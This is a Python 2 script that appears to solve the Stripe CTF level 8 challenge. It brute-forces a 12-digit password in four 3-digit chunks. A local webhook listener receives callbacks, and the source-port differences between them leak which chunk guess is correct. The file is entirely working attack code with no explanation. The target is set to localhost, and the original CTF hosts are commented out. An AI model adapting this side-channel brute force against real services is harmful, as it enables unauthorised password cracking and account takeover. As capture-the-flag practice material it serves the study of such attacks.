#!/usr/bin/python
import SimpleHTTPServer
import SocketServer
from multiprocessing import Process, Pipe
import sys
import urllib
import urllib2

class ServerHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):
    def do_GET(self):
        print self.headers
        SimpleHTTPServer.SimpleHTTPRequestHandler.do_GET(self)

    def do_POST(self):
        client_port = self.client_address[1]
        client_response = self.rfile.read(int(self.headers['Content-Length']))
        self.send_response(200)
        self.end_headers()

        child_conn.send(["RESPONSE", client_port, client_response])

#Make global for now instead of figuring out how to pass params to the
#handlers
child_conn = None
parent_conn = None

def webhook(conn):
    child_conn = conn
    Handler = ServerHandler
    httpd = SocketServer.TCPServer(("", 0), Handler)
    print "serving at port", httpd.server_address
    child_conn.send(["PORT", httpd.server_address[1]])
    httpd.serve_forever()
    
def post(target_url, post_data):
    print post_data
    request = urllib2.Request(target_url, post_data)
    response = urllib2.urlopen(request)
    #print 'POST Reponse = ' + response.read()

def make_post_data(password_to_check, source_wo_port, listener_port):
    return '{{"password": "{0}", "webhooks": ["{1}:{2}"]}}'.format(password_to_check, source_wo_port, listener_port)

def make_password(current_guess):
    return "{0:03}{1:03}{2:03}{3:03}".format(*current_guess)

def clean_exit(p):
    p.terminate()
    print 'Terminated listener'
    sys.exit()

if __name__ == "__main__":
    #TARGET = "https://level08-2.stripe-ctf.com/user-emplgtaikw/"
    #SOURCE_WO_PORT = "level02-3.stripe-ctf.com"
    #STD_DIFF = 2
    
    TARGET = "http://127.0.0.1:3333"
    SOURCE_WO_PORT = "127.0.0.1"
    STD_DIFF = 3
    
    parent_conn, child_conn = Pipe()
    p = Process(target=webhook, args=(child_conn,))
    p.start()
    listener_port =  parent_conn.recv()[1]
    print "listening on port {0}".format(listener_port)

    current_guess = [0, 0, 0, 0]
    current_chunk = 0
    last_port = -1
    while True:
        try:
            while current_chunk <= 3:
                sieve = [x for x in range(1000)]
                while len(sieve) > 1:
                    for i in range(1000):
                        if i not in sieve:
                            continue
                        else:
			    current_guess[current_chunk] = i
			    post(TARGET, make_post_data(make_password(current_guess), SOURCE_WO_PORT, listener_port))    
			    _, client_port, client_response = parent_conn.recv()
			    print '{0} --> {1}'.format(client_port, client_response)
                    
			    if last_port == -1:
				last_port = client_port
			    elif "true" in client_response:
				print "CTF = {0}".format(current_guess)
				clean_exit(p)
			    else:
				diff = client_port - last_port
				if diff ==  STD_DIFF + current_chunk:
				    sieve.remove(i)
				last_port = client_port
			    print len(sieve)
        
                current_guess[current_chunk] = sieve[0]
                current_chunk += 1           
        except KeyboardInterrupt:
            clean_exit(p)
